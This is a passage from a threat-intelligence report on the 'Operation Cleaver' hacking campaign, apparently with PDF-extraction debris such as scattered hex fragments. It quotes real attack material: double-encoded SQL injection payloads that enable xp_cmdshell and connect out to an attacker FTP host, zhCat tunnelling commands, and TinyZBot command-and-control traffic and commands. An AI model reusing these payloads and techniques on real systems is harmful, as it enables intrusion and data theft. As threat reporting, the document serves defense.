OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TACTICS , TECHNIQUES & PROCEDURES
The Cleaver campaign used a variety of methods in multiple stages of attacks . In this section we ’ll
cover the commonly observed methods during different stages of the attack .
INITIAL COMPROMISE
The initial compromise gets the attackers their first foothold into the target network . Once the
ability to execute arbitrary code has been established , an attacker ’s job becomes quite a bit
easier . Since the vector of initial compromise is usually determined by what is vulnerable on the
target , we ’ll cover just a few of the techniques we ’ve seen Operation Cleaver use to initiate the
compromise .
SQL Injection
SQL injection is a very common and simple attack method . It is made possible by a lack of input
sanitization by the vulnerable application before supplying that input into a SQL database query .
SQL injection payloads used by this organization have been double encoded . Double encoding
SQL injection payloads allows for bypassing of various anti - exploitation filters , such as those
supplied by Web Application Firewalls ( WAFs ) .
The attackers would enable xp_cmdshell :
http://localhost / Demos / demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp _
cmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo .
sp_configure%20@b2,%201;RECONFIGURE;--%20
Then connect outbound via anonymous FTP :
http://localhost / Demos / demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@
b1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20
Spear - Phishing Campaign
Using messaging methods such as email , attackers can social engineer users into downloading
and executing software , which quietly installs malware alongside of the desired program .
Operation Cleaver has employed this technique numerous times across different organizations .
32
# OPCLEAVER
EasyResumeCreatorPro.com
The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct
copy of a legitimate website at winresume.com . This is how the original site looked :
6   f20476 f64
4   4
20
Figure 14 : The original Easy Résumé Creator Pro website on winresume.com is legitimate .
c
c2
b204576696
e6
96
86
Figure 15 : The fraudulent website , easyresumecreatorpro.com , is a fraudulent copy of the Easy
546
Resume Creator Pro website to lure job candidates to download and install their TinyZBot agent .
That ’s not all they copied . In order to infect users , they combined the original Easy Resume Creator
Pro product with malware by using a binder they developed internally named Binder_1 . A binder
is an application , which combines two executables ( desired software and malware ) into a single
executable .
The resulting executable masquerades as the desired software . The purpose is deception , to make
the binder indistinguishable from the desired application . When executed , both applications are
written to a temporary directory and executed . This way it appears that the desired application was
executed , but the malware was also executed silently .
33
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Teledyne Résumé Submitter
This attack evolved to appear more legitimate . The
attackers made the victims feel like they had a pending
job opportunity at the industrial conglomerate Teledyne . In
order to take advantage of this job opportunity , the victim
needed to use the fake résumé submission application
supplied by the malicious recruiter . Multiple domains were
registered in order to make the download sites seem more
realistic . These domains included other companies as they
tried to hit a wider audience .
Figure 16 : When the résumé submitting
application is executed , a splash screen is
displayed .                                                  • Teledyne - Jobs.com
• Doosan - Job.com
• NorthropGrumman.net
At this point , the résumé submission application checks the
Internet connection . If it is unable to connect to the Internet ,
it will display a window to input proxy information .
When this information is entered , the results are cached
in a location the dropped malware can access . After an
Internet connection is ensured , the malware ( TinyZbot ) is
dropped and executed . This clever scheme makes sure the
malware can connect to the command and control server ,
Figure 17 : Unable to connect to the Internet , the
and increases the chances that domain credentials are
tool prompts the user for proxy configuration
information .                                         cached on the now infected machine . Shortly after , the main
application is launched .
Figure 18 : Final résumé submission form
displays to the user while the malware runs
freely in the background .
34
# OPCLEAVER
Teledyne Résumé Submitter ( cont . )
The first résumé submission form requests contact information . This form , like the rest of the
submission forms , only stores the submitted information while the application is running . As the
infected user is going through and filling out all this information , the malware is running in the
background , logging their keystrokes , retrieving their stored passwords , etc . Once all the forms are
filled out , the user goes to the submission form .
6f20476 f64
44
20
c
c2
b204576696
6
Figure 19 : GET request to www.microsoft.com fakes the résumé submission .
6e
9
86
546
When the victim hits submit , the résumé submitter does a GET request to microsoft.com in order
to make it seem like it is submitting something , then claims success .
This method is particularly effective not only because of its level of deception , but even if the victim
suspects that they are infected with malware , they are not as likely to speak up about it , as they
would need to explain why they were submitting a job application for another company .
35
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
PRIVILEGE ESCALATION & PIVOTING
Privilege escalation is a category of techniques that describe the process of going from a less
privileged user on a compromised computer to a more privileged user . This increase in privileges
allows for the attacker to gain access to privleged areas of the operating system as well as to
infect other computers on the target network .
This team did not utilize any novel methods of privilege escalation , but they were observed
using a variety of publicly known exploits . PrivEsc is a compiled exploit , which leverages
the vulnerability commonly referred to as KiTrap0D ( CVE-2010 - 0232 ) . The exploit allows for
escalation of privileges on unpatched Windows operating systems from an unprivileged user to
kernel - level privilege .
This vulnerability and the corresponding exploit were discovered and developed in 2010 .
The plagiarized version used in Operation Cleaver was compiled in May 2013 , with a slight
modification to the public source code . This modification changed the author ’s details to Zhopin
Exploit Team .
Pivoting is the process of leveraging access from one compromised computer in order to gain
access to additional systems on the target network . This can involve launching attacks from the
compromised computer , or simply abusing access once it has been gained .
Cached Credential Dumping
A very common method of pivoting on a predominantly Windows operating system based
network is to extract domain credentials which have been used on the compromised computer
from a credential cache . There are a few well - known tools which are capable of doing this given
sufficient privileges on the infected host . Two of these tools used by Cleaver are Mimikatz and
Windows Credential Editor .
zhMimikatz and MimikatzWrapper
Two similar applications were developed by Operation Cleaver in order automate the execution
of Mimikatz . These applications are zhMimikatz and MimikatzWrapper . These applications store
multiple versions of Mimikatz in their resources . When executed , they determine which version
of Mimikatz to use based on whether the computer ’s version of Windows is 32-bit or 64-bit . This
technique is uncommon in malware and shows the advanced skillset of the Cleaver team . Both
tools were developed in C#.
36
# OPCLEAVER
zhMimikatz and MimikatzWrapper ( cont . )
In the following examples , the computer name is TheComputerName , the username of the
logged in user is TheUser , and that user ’s password is ThePassword . At the time of execution ,
the system only has its own credentials available and no cached network credentials .
zhMimikatz
zhMimikatz executes the correct version of Mimikatz for the current system , and parses the results
for any cached credentials .
6f20476 f64
44
20
c
c2
b204576696
e6
96
86
546
Figure 20 : zhMimikatz
37
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
MimikatzWrapper
Output from MimikatzWrapper is essentially the same as zhMimikatz , despite being a different
Visual Studio project .
Figure 21 : The MimikatzWrapper .
The only external difference is that MimikatzWrapper also logs these results to res.txt in the
executing directory . This can make it useful for tools like the PVZ tool chain and Csext to execute
with logged results :
Figure 22 : The MimikatzWrapper dumps credentials out to a file .
38
# OPCLEAVER
PsExec Spreading
Once an attacker has credentials extracted from the cache , whether in hash form or in plaintext
form , PsExec can be used to run commands on any other computer which accepts those domain
credentials . If this technique is combined with cached credential dumping , it can be used to jump
from computer to computer on a compromised network .
NetC ( Net Crawler )
Net Crawler utilizes a cached credential dumping technique along with PsExec in order to
worm throughout a network , collecting any and all credentials that it can extract from credential
caches . It has the ability to do this with both Windows Credential Editor and Mimikatz . It starts by
first extracting cached credentials from the infected computer ’s cache . Once this is complete , it
f20476 f64
then continues to scan a set of configured IP addresses on the local subnet to determine which
6
4
IP addresses have SMB related ports open . Then an iterative methodology is applied to brute
4
20
forcing each SMB enabled target with each credential that was extracted from the cache .
c
When a positive result has been achieved , it will create a copy of itself with a modified
c2
configuration stored as a PE resource , then send and execute the copy utilizing PsExec . This
04576696
copy repeats the behavior of the original , but with already discovered credentials as well as
newly discovered ones on the newly infected host . Any credentials found are reported back to
the original infection .
6b2
6e
9
86
546
39
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
NetC ( Net Crawler ) cont .
The following is a sample of some of the recovered results of Net Crawler executing on a live
network :
Figure 23 : The real output of a successfully run NetC effort at a victim organization .
A more in depth analysis of Net Crawler , as part of the A Study in Bots series , will be available on
Cylance ’s blog .
40
# OPCLEAVER
MS08 - 067 Exploit
MS08 - 067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can
be exploited by a specially crafted packet to the operating system ’s RPC network interface . This
vulnerability has been patched since October 2008 , but many networks have failed to update their
systems even to this day .
Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability
developed in Python . Someone in the Cleaver team ( presumed to be Nesha ) modified the exploit to
read “ By Nesha ” .
Jasus
f20476 f64
Jasus is an ARP cache poisoner developed by the Operation Cleaver team . It makes use of
6
4
WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning
4
20
utilities , Jasus is poorly developed and without many useful features . The primary positive attribute
of Jasus is its poor detection ratio by the antivirus industry .
c
c2
Cain & Abel
04576696
Cain & Abel is a publicly available toolkit , which covers a wide range of functionality that assists
attackers once they have compromised a node on a network . It has the ability to dump stored and
cached credentials , and conduct attacks like ARP cache poisoning in order to capture credentials
being transmitted on the network . It also has a remotely installable trojan named Abel , which
enables some of its functionality on a remote target .
b2
We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches
6
and the network when they are confident that there is little to no antivirus protection on the infected
e
target .
96
6
EXFILTRATION
8
546
Exfiltration is the process of moving information to an external site . In this context , it is the process
of stealing information without being detected . Operation Cleaver has a strong focus on stealing
confidential / privileged information , and they have utilized a few methods in order to facilitate this
objective .
41
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Anonymous FTP Servers
Cleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access
enabled in order to pilfer large quantities of information . This allowed them to use existing
command line utilities available on their targets in order to upload information . This is a versatile
technique as it does not require any additional software which could be detected . These
FTP servers were also observed during the infection process , as infected computers were
often instructed to download additional files from these FTP servers , including backdoors and
pivoting tools .
The following IP addresses hosted FTP servers that were used in the infection of targets or in
the exfiltration of information .
•     108.175.152.230       – Santa Rosa , CA , USA
•     108.175.153.158       – Santa Rosa , CA , USA
•     184.82.181.48 –       Pilot Mountain , North            Carolina , USA
•     203.150.224.249       - Thailand
•     64.120.208.74 -       Pilot Mountain , North            Carolina ,      USA
•     64.120.208.75 -       Pilot Mountain , North            Carolina ,      USA
•     64.120.208.76 -       Pilot Mountain , North            Carolina ,      USA
•     64.120.208.78 -       Pilot Mountain , North            Carolina ,      USA
•     66.96.252.198 -       Pilot Mountain , North            Carolina ,      USA
NetCat
NetCat is a network tool which has many valid purposes but can also be used for malicious
purposes . Its main functionality allows for a client and server communication channel , allowing
for information to be transported over the network simply . NetCat has an option when being
compiled to enable or disable the ability for NetCat to execute a command after the connection
is established . This feature can be abused to enable a reverse connecting shell , which can be
used to remotely control a target .
NetCat ’s network communications are in plaintext , and could be viewed by an egress filter
looking to block the exfiltration of sensitive information . The Operation Cleaver team was
observed attempting to use NetCat to exfiltrate information as well as use it as a reverse
connecting shell . The use of NetCat was later replaced with zhCat .
42
# OPCLEAVER
zhCat
zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat . Its
main purpose is to create a channel that is capable of transporting information over the network .
The changes made in zhCat allow for this information to be transferred with inline obfuscation and/
or encryption . This makes it more difficult to detect that privileged information is being exfiltrated .
The command line help ( of a particular version ) shows the following options :
6f20476 f64
44
20
c
c2
04576696
Multiple obfuscation / encryption methods are available . The –h argument enables HTTP mode .
This makes the traffic between zhCat instances look like benign HTTP traffic . For instance , if the
attackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode , the
client instance of zhCat would use the following command :
b2
zhcat.exe –h –p 1000 –i 192.168.116.128
e6
The server instance would use the following command :
96
86   zhcat.exe –l –h –p 1000
546
When we run both of these , we can send information just by typing it into the terminal of the
running application . Information can be supplied by standard input .
43
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
zhCat ( cont . )
If we observe the network communications during this transfer , we can see the following HTTP
POST request .
Note : research into ebizmba.com did not turn up any additional evidence of being involved
with the development of zhCat .
On the server side , we can see our message has been received :
If stricter egress filtering is enabled , the attackers can use zhCat to also XOR encrypt the traffic
with a shared key . These keys are stored inside zhCat . The following is the key used for XOR
encryption :
Sorry ! The handle to file % s is not a valid handle any more.\nSorry !
The handle to file % s is not a valid handle any more .
The \n represents hex character 0x0A , which is a new line character .
An attacker could set up a server instance of zhCat with the following command in order to
enable both HTTP and XOR obfuscation :
zhcat.exe –h –p 1000 –l –x
The client instance could then be invoked with the following command :
zhcat.exe –h –p 1000 –i 192.168.116.128 –x
Once again , information can be supplied via standard input .
44
# OPCLEAVER
zhCat ( cont . )
Upon inspecting the network traffic again , we see the following HTTP POST request .
6 f 20476 f64
4 4
20see this information being received :
On the server side , we can
c
c2
04576696
zhCat has a variety of other features such as port mirroring as well as traffic redirecting .
PLink
b2
PLink is one of the many utilities provided in the PuTTY ( SSH ) suite , which has many benign
e6
purposes . It is capable of communicating over various protocols , the most notable being SSH .
6
The SSH protocol is a heavily utilized encrypted protocol , most commonly used for remote
9
administration of UNIX based operating systems . PLink is designed to implement some of the
6
8
SSH functions related to forwarding traffic as well as other functionality .
546
Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers . This allows them
to easily connect to RDP servers inside the networks of their victims . These RDP connections can
be used to exfiltrate information visually , as well as to remotely control the computers hosting the
RDP servers .
45
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
SMTP
Early Cleaver operations abused SMTP in order to exfiltrate information . The sending is
performed by internally developed malware samples such as TinyZBot and Csext in order to
exfiltrate information about the infected computer , as well as requested files and keystroke
logging information . Messages were sent using an open SMTP relay at BeyondSys.com with
the sender email address dyanachear(at)beyondsys.com . This allowed the attackers to use
infrastructure that was not theirs to exfiltrate information . The known recipient addresses of this
information were testmail_00001(at)yahoo.com and TerafficAnalyzer(at)yahoo .
com . In order to deceive anyone reading these emails , they made them appear to be a spam
message that most would not think twice about . The subject used is the following :
No Prescription required . Viagra Dosages : 25 , 100 , 150 mg .
Fast worldwide delivery .
The message used is the following :
Buy Viagra150 mg x 50 tablets for only $ 124.99 !
No Prescription required . Viagra dosages : 150 , 100 , 25 mg . Fast
Worldwide Delivery .
See the attachment movie .
Free bonus trip .
bestviagra4u.cn
The files being exfiltrated are added to the email as attachments .
SOAP
SOAP is a sub - protocol communicated via HTTP . In relation to Operation Cleaver , it is used as the
command and control protocol for TinyZBot , which was the preferred backdoor , and underwent
long - term development . HTTP communications are often used by botnets , but it is uncommon
to use a sub - protocol such as SOAP . It is likely that SOAP was used because it is simple to
implement in C # , and has the added benefit of blending in with other benign HTTP traffic .
As part of TinyZBot ’s command and control protocol , files can be exfiltrated over SOAP to the
command and control server . For more information about TinyZBot , see the Persistence section .
46
# OPCLEAVER
PERSISTENCE
Persistence is the means of maintaining access to a compromised network . There are limitless
methods of persistence ; the following are techniques and tools for persistence used by Cleaver .
TinyZBot
TinyZBot is a backdoor developed in C#. This bot is the longest developed malware we have
analyzed from this organization . The earliest known version was compiled in January 2013 and
we continued to see new versions being created actively . The purpose of TinyZBot is to gather
information from an infected computer as well as maintain and further access into a compromised
network .
f20476 f64
TinyZBot was developed with the clear intention of targeted campaigns . The name TinyZBot is
6
4
assumed to be referring to this project as a less versatile version of the ZeuS botnet , although
4
20
it does not exhibit the major browser injection features of ZeuS. To be clear , TinyZBot shares
no code with ZeuS or its variants , and is developed in a different programming language . The
c
majority of the code in TinyZBot was created by Cleaver .
c2
04576696
TinyZBot Features
TinyZBot supports a wide array of features that continually evolved over time . For the evolution of
features , see the History section . The following is a list of supported features :
•    SMTP exfiltration
2
•    Log keystrokes
b
•    Monitor clipboard activity
6
•    Enable a SOAP - based command and control channel
e
•    Self - updating
96
•    Download and execute arbitrary code
•    Capture screenshots         86
•
•
546
Extract saved passwords for Internet Explorer
Install as a service
•    Establish persistence by shortcut in startup folder
•    Provide unique malware campaign identifiers for tracking and control purposes
•    Deceptive execution methods
•    Dynamic backdoor configuration
•    FTP exfiltration
•    Security software detection
•    Ability to disable Avira antivirus
•    Ability to modify PE resources
•    Dynamic plugin structure
47
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TinyZBot Command and Control Protocol
The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP .
Potential reasons for using SOAP are :
1 . SOAP - based communications are simple to implement in C#.
2 . SOAP traffic could easily be considered benign traffic , as it is not commonly seen in malware .
As part of SOAP communications , a URI is specified . This is internal to the sub - protocol , and does
not necessarily reflect the URI of the host running the SOAP server ( ASMX file ) . In the case of
TinyZBot , and many examples for developing SOAP applications , this URI is tempuri.org .
Since the first version of the SOAP - based command and control protocol was implemented ,
TinyZBot used what is referred to as a “ dynamic password ” . The result of this is a
cryptographically hashed version of the server time ( which must be obtained through a SOAP
query ) , the TinyZBot ’s GUID , and the TinyZBot ’s AppUsageID ( campaign identifier ) .
For the command and control examples below , red text represents TCP data sent from the
TinyZBot infection while blue text represents TCP data sent from the command and control
server . The server time lookup query invokes the SOAP command GetServerTime .
POST /checkupdate.asmx HTTP/1.1
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; MS Web Services Client Protocol 2.0.50727.1433 )
Content - Type : text / xml ; charset = utf-8
SOAPAction : “ http://tempuri(dot)org / GetServerTime ”
Host : microsoftactiveservices(dot)com
Content - Length : 291
Expect : 100-continue
Connection : Keep - Alive
HTTP/1.1 100 Continue
< ? xml version=”1.0 ” encoding=”utf-8”?><soap : Envelope
xmlns : soap=”http://schemas.xmlsoap.org / soap / envelope/ ” xmlns : xsi=”http://www.w3.org/2001/
XMLSchema - instance ”
xmlns : xsd=”http://www.w3.org/2001/XMLSchema”><soap : Body><GetServerTime xmlns=”http://tempuri .
org/ ” /></soap : Body></soap : Envelope >
HTTP/1.1 200 OK
Cache - Control : private , max - age=0
Content - Type : text / xml ; charset = utf-8
Server : Microsoft - IIS/7.5
X - AspNet - Version : 2.0.50727
X - Powered - By : ASP.NET
Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 392
48
# OPCLEAVER
TinyZBot Command and Control Protocol ( cont . )
< ? xml version=”1.0 ” encoding=”utf-8”?><soap : Envelope
xmlns : soap=”http://schemas.xmlsoap.org / soap / envelope/ ” xmlns : xsi=”http://www.w3.org/2001/
XMLSchema - instance ”
xmlns : xsd=”http://www.w3.org/2001 XMLSchema”><soap : Body><GetServerTimeResponse xmlns=”http://
tempuri.org/”><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></
GetServerTimeResponse></soap : Body></soap : Envelope >
This is the first query done by a running TinyZBot instance , and needs to be done shortly before
most other queries , in order to update the dynamic password .
Commands , updates and files to drop and execute are stored as files on the SOAP server , and
access is restricted by the AppUsageID as well as the bot GUID . This allows for commands to be
6f20476 f64
sent to all bots for a campaign as well as individual control . The TinyZBot queries the server in
order to enumerate all files currently available to it .
4 4
0
User - Agent : Mozilla/4.0 2
POST /checkupdate.asmx HTTP/1.1
( compatible ; MSIE 6.0 ; MS Web Services Client Protocol 2.0.50727.1433 )
c
Content - Type : text / xml ; charset = utf-8
c2
SOAPAction : “ http://tempuri(dot)org / GetFileList ”
Host : microsoftactiveservices(dot)com
04576696
Content - Length : 425
Expect : 100-continue
HTTP/1.1 100 Continue
< ? xml version=”1.0 ” encoding=”utf-8”?><soap : Envelope xmlns : soap=”http://schemas.xmlsoap.org/
soap / envelope/ ”
xmlns : xsi=”http://www.w3.org/2001/XMLSchema - instance ” xmlns : xsd=”http://www.w3.org/2001/
XMLSchema”><soap : Body><GetFileList xmlns=”http://tempuri(dot)org/”><Id>00cf6217 - 8c7e-4598-
b155 - 65ebd949bba9</Id><AppType > XYZCO</AppType><IP /><Pass > abefc81</Pass><Version > BDFF;1.0.0</
2
Version></GetFileList></soap : Body></soap : Envelope >
6b
HTTP/1.1 200 OK Cache - Control : private , max - age=0
e
Content - Type : text / xml ; charset = utf-8
6
Server : Microsoft - IIS/7.5 X - AspNet - Version : 2.0.50727
9
X - Powered - By : ASP.NET Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 1474            86
546
< ? xml version=”1.0 ” encoding=”utf-8”?><soap : Envelope xmlns : soap=”http://schemas.xmlsoap.org/
soap / envelope/ ”
xmlns : xsi=”http://www.w3.org/2001/XMLSchema - instance ”
xmlns : xsd=”http://www.w3.org/2001/XMLSchema”><soap : Body><GetFileListResponse xmlns=”http://
tempuri.org/ ” >
49
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TinyZBot Command and Control Protocol ( cont . )
< GetFileListResult><string>[ALL]__b93c-49a1 - 140914084450__[0000000000000000000000000000
0000].tmu</string><string>[ALL]__b93c-49a1 - 140914084612__[0000000000000000000000000000
0000].tmu</string><string>[ALL]__b93c-49a1 - 140914084619__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1 - 140914084628__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1 - 140914084638__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1 - 140914084644__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1 - 140914084659__[000000000000000000000000000000
00].tmu</string><string>[ALL]__b93c-49a1 - 140914084715__[0000000000000000000000000000000
0].tmu</string><string>[ALL]__b93c-49a1 - 140914084732__[00000000000000000000000000000000
] .tmu</string><string>[ALL]__b93c-49a1 - 140914084741__[00000000000000000000000000000000 ] .
tmu</string><string>[ALL]__b93c-49a1 - 140914090807__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1 - 140915103605__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1 - 140915103610__[00000000000000000000000000000000].tmu</string></
GetFileListResult></GetFileListResponse></soap : Body></soap : Envelope >
In order to download the file and parse for commands to execute , the TinyZBot must request the
file . The file is downloaded Base64-encoded inside of the SOAP response .
POST /checkupdate.asmx
HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; MS Web Services Client Protocol
2.0.50727.1433 )
Content - Type : text / xml ; charset = utf-8
SOAPAction : “ http://tempuri(dot)org / GetFile ”
Host : microsoftactiveservices(dot)com
Content - Length : 478
Expect : 100-continue
HTTP/1.1 100 Continue
< ? xml version=”1.0 ” encoding=”utf-8 ” ? >
< soap : Envelope xmlns : soap=”http://schemas.xmlsoap.org / soap / envelope/ ” xmlns : xsi=”http://www .
w3.org/2001/XMLSchema-instance ”
xmlns : xsd=”http://www.w3.org/2001/XMLSchema ” >
< soap : Body><GetFile xmlns=”http://tempuri(dot)org/”><Id>00cf6217 - 8c7e-4598-b155 - 65ebd949bba9</
Id><AppType > XYZCO</AppType><IP /><Pass > abefc81</Pass><FileName>[ALL]__b93c-49a1 - 140914084450 _ _
[ 00000000000000000000000000000000].tmu</FileName></GetFile></soap : Body></soap : Envelope >
HTTP/1.1 200 OK
Cache - Control : private , max - age=0
Content - Type : text / xml ; charset = utf-8
Server : Microsoft - IIS/7.5
X - AspNet - Version : 2.0.50727
X - Powered - By : ASP.NET Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 652
< ? xml version=”1.0 ” encoding=”utf-8”?><soap : Envelope xmlns : soap=”http://schemas .
xmlsoap.org/soap/envelope/ ” xmlns : xsi=”http://www.w3.org/2001/XMLSchema - instance ”
xmlns : xsd=”http://www.w3.org/2001/XMLSchema ” >
< soap : Body><GetFileResponse xmlns=”http://tempuri(dot)org/ ” >
< GetFileResult > OzIwMTQwOTE0X18wODQ0NTANClJVTkNNRD1jbWQuZXhlLC9DIGlwY29uZmlnIC9hbGwgP
j4gIltJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dCIgMj4mMQ0KV
VBMT0FEPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA0KREVMR
VRFPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA==
< /GetFileResult></GetFileResponse></soap : Body></soap : Envelope >
50
# OPCLEAVER
TinyZBot Command and Control Protocol ( cont . )
The command file downloaded in this example is as follows :
; 20140914__084450
RUNCMD = cmd.exe,/C ipconfig /all > > “ [ INFOLDER]\d2db696a-3367 - 4699-a815-df09098bc596.txt”2>&1
UPLOAD=[INFOLDER]\d2db696a-3367 - 4699-a815-df09098bc596.txt
DELETE=[INFOLDER]\d2db696a-3367 - 4699-a815-df09098bc596.txt
The first line is a timestamp of the command . The TinyZBot command parser ignores it . The
RUNCMD line requests that cmd.exe be executed , with the command ipconfig /all being
redirected to a file in a directory designated for files to be uploaded . The UPLOAD command
requests that this file is then uploaded over SOAP to the command and control server . The
DELETE command then requests that the file be deleted from the infected system .
f20476 f64
The following is a list of supported commands that TinyZBot responds to :
6
KILL 4
4
COPY
REPLACE
2 0
DEEPKILL
GETSCREENSHOT
CREATEUPLOADLIST
UNLOADALL
RELOADALL
DELETE                   EXIT             FORCERESTART                        ADDSEC
c
UPLOAD                   EXITFORCE             FORCEEXIT                      REMSEC
c2
FUPLOAD                  RUNAVDETECTOR         UNLOADMODULE                   ADDKV
04576696
CLEARFILES               RUNWAIT               RELOADMODULE                   CHGKV
CLEAROUPUTFOLDER         RUNCMD                LOADMODULE                     REMKV
SAVECONFIG               UCMD                  UNLOADM                        ADDK
SAVETOCFGFILE            GETINFO               RELOADM                        REMOVEK
RESTART                  GETSCREENSHOTHQ       REMOVEM
RestartForce
Commands such as GETINFO are often run on newly infected systems , as they decide whether
the infection has hit the correct target . There are additional SOAP commands , but they will not be
2
covered in detail . The following is a list of all the SOAP commands : CheckFileMD5 , GetFile ,
b
GetFileList , GetServerTime , UploadFile .
e6
6
Deception
9
86
546
TinyZBot is commonly installed using some form of deception . Recent versions use the resume-
based methods reported in the Initial Compromise sections . An additional method was used for
earlier versions . When early versions of TinyZBot were executed , they opened an image stored
in the resource section of the executable and copied the malicious TinyZBot executable to the
% AppData% directory .
Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe . The
backdoor additionally replaced the original malicious executable with an appropriately named
image file and padded the image file with null bytes in order to mirror the original file size .
51
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
History
The earliest known version on TinyZBot was compiled on January 27 , 2013 . This early version
had very little functionality . It was limited to logging keystroke data , sending emails , and creating
a link in the user ’s startup folder for persistence . Its method of exfiltrating the logged keystrokes
relied upon a hardcoded email address stored in the binary . The sender email address was
dyanachear(at)beyondsys.com and emails were destined for testmail_00001(at )
yahoo.com . The message was intended to look like common Viagra spam from China , but
would be sent with the keystroke logging data as attachments , as well as system information .
The initial version did not provide any means of receiving commands and was obfuscated with
SmartAssembly . The following iteration compiled on March 12 , 2013 , only contained minor bug
fixes .
The next version was compiled on April 24 , 2013 . This version starts to look more like an
average bot . A command and control protocol was established , using HTTP and SOAP for the
protocol . The command and control server for this version was located at 173.192.144.68/
DefaultWS(dot)asmx . This new command and control protocol allowed for the addition of
quite a few other features . An update mechanism was added , and could be regularly scheduled ,
so unassisted periodic update checks were automatically performed . The SOAP API used a
dynamic password mechanism , which required the computation of a simple key in order to
access certain parts of the API . The email data exfiltration method also underwent modification
to be activated at a scheduled interval . There were also some changes , which looked to be bug
fixes , such as limiting the number of times sending an email could fail .
The next day , April 25 , 2013 , a new version was compiled which allowed for self - deletion .
On May 14 , 2013 , we noticed a change which assisted in the identification of active targets .
The AppUsageId ( at this point named AppType ) was an identifier used by this organization in
order to differentiate between targets infected with TinyZBot , meaning they could effectively
run multiple campaigns using the same command and control server and know which target
was infected . This also allowed for separate commands to be supplied to different targets
without the need for per - bot commands . At this time , the AppUsageId was total0 , but later
we observed names , which aligned with active targets . The exfiltration email address was also
changed to TerafficAnalyzer(at)yahoo.com .
On June 17 , 2013 , there was an addition that allowed for the loading of configuration data from
the PE ’s resources . At this time , it was limited to the exfiltration email address . This version was
not obfuscated with SmartAssembly
52
# OPCLEAVER
History ( cont . )
We do not see a new version of TinyZBot until June 7 , 2014 . There are quite a few notable
improvements , but nowhere near enough to indicate consistent development on the project for
a year . SmartAssembly was reused again . A method was added to detect what security related
software is installed . Avira antivirus was specifically targeted and disabled , due to its detection of
the new keystroke logger module added in this version . This keystroke logger source is publicly
available and referred to as DeadkeyLogger .
A new string encryption class is added , but the code was copied and pasted from a Microsoft
example . The ability to extract Internet Explorer passwords was added . Clipboard monitoring
code was added , but not invoked . The emailing features were removed , but the classes which
20476 f64
previously contained them were still present but empty . Many more options were enabled to
6    f
be loaded from PE resources . The ability to add PE resources was added . Another version was
4
4
compiled on June 7 , 2014 , with no feature difference .
0
On June 17 , 2014 , we see2the first instance of Binder_1 , which is aptly named , as it is a binder .
c
The legitimate application used in this version of Binder_1 was compiled on August 22 , 2013 ,
c2
and is a self - extracting archive of desktop wallpapers , including an image from the game Mirror ’s
04576696
Edge . The TinyZBot included was the version compiled on June 7 , 2014 .
The version compiled on June 23 , 2014 , added functionality which allowed screenshots of the
desktop to be taken .
On August 2 , 2014 , we see another version without SmartAssembly obfuscation . A bug fix is made
to the keystroke logging method , and clipboard monitoring is enabled .
6b2
Three items were compiled on August 18 , 2014 . Two of them are TinyZBot binaries , which contain
e
a minor key logging bug fix . The third is a new Binder_1 instance , which contains one of the
6
TinyZBot instances compiled that day . The legitimate application included in this binder is called
9
Easy_resume_creator and is a legitimate application named EasyRésuméCreatorPro . This
86
version targeted a major Saudi Arabian oil company .
546
From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the
AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign
Affairs in the Persian Gulf , and a major airline holding company in UAE . These versions of
TinyZBot moved towards a more modular architecture where each component was in its own
.NET assembly . This was presumably done to limit antivirus detection of each individual file as
well as allow for dynamic updating of specific modules . All of these were included in their own
Binder_1 instance , which also dropped Easy_resume_creator .
53
476f6f64
6f20
44
OPERATION
20
2c
